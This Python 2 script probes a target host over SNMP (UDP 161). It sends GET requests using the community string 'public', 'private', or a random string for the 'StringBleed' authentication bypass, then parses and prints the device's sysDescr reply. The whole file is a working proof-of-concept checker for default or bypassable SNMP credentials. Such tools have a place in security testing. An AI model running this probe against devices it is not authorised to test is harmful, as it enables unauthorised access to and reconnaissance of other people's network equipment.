
import sys
import socket
from pktSnmp import * 
import random

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'

def help():
	print Colors.ORANGE+" [*] Prove possible communitys strings on SNMP"
	print Colors.GREEN+" [+] Use:"+Colors.BLUE+"\n\t%s <host> < [public | private | stringbleed] > " % sys.argv[0]
	print "\n"+Colors.DEFAULT

	exit(1)

try:
	hostSNMP 	= sys.argv[1]
	commStr 	= (sys.argv[2]).lower()
except:
	help()
	
communities = []


def asctohex(string_in):
	a=""
	for x in string_in:
		a = a + ("0"+((hex(ord(x)))[2:]))[-2:]
	return a

def stringbleed(rand): # rand harcoded = 7 
    commName = ""
    for i in random.sample('abcdefghijklmnopqrstuvwxyz1234567890',rand):
    	commName += i
    return commName

randomComm 		= stringbleed(7)
communityBleed	= asctohex(randomComm)

# Community string
commPublic 	= str('7075626c6963')
commPrivate = str('70726976617465')


communities = [commPublic,commPrivate,communityBleed]

# example OIDs
oid1 ='2b06010201010100'  # iso.3.6.1.2.1.1.1.0 
oid4 ='2b06010201010400'  # iso.3.6.1.2.1.1.4.0 
oid5 ='2b06010201010500'  # iso.3.6.1.2.1.1.5.0 
oid6 ='2b06010201010600'  # iso.3.6.1.2.1.1.6.0 



def snmpMethod(HOST,addrOID,nmComm):

	frameSNMP = getFUllPkt(addrOID,nmComm)
	client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	client.settimeout(2.5)

	try:
		client.sendto(frameSNMP.decode('hex'),(HOST,161))
		response1  = client.recv(1024).encode('hex')

	except Exception, e:
		print 'host not found'
		# 		OR
		print "Timeout"
		exit(0)

	print Colors.GREEN+"\n [+] Community: \n [>] "+Colors.ORANGE+ nmComm.decode("hex")
	print "\n"+Colors.DEFAULT

	# ------------------------------------------------------------------ #
	lengthOID 	= int(len(addrOID)) 									# Longitud del OID
	
	initOID 	= int(response1.find(addrOID))  						# Buscar index donde inicia el OID dentro de la trama
	finOID  	= initOID + lengthOID 									# Index, donde termina el OID

	pktIsLen 	= 	response1[finOID + 2:finOID+4]  					# field OID + 2 bytes = is byte LENGTH ?
	lenValue 	= 	hex(len(response1[finOID + 4:]) /2)[2:].zfill(2)  	# LENGTH value of snmp response
	
	if pktIsLen == lenValue:
		initResp = finOID + 4
	else:
		initResp = finOID + 6
	# ------------------------------------------------------------------# 

	viewResponse = str(response1[initResp:]).decode('hex')
	print Colors.GREEN+" [+] sys_Description ("+Colors.BLUE+" [ iso.3.6.1.2.1.1.1.0 ] "+Colors.GREEN+"):\n [>] "+Colors.ORANGE+viewResponse+"\n"+Colors.DEFAULT
	
	client.close()



if commStr == "public":
	CS = communities[0]
elif commStr == "private":
	CS = communities[1]
elif commStr == "stringbleed":
	CS = communities[2]
else:
	help()

	exit(0)



snmpMethod(hostSNMP,oid1,CS)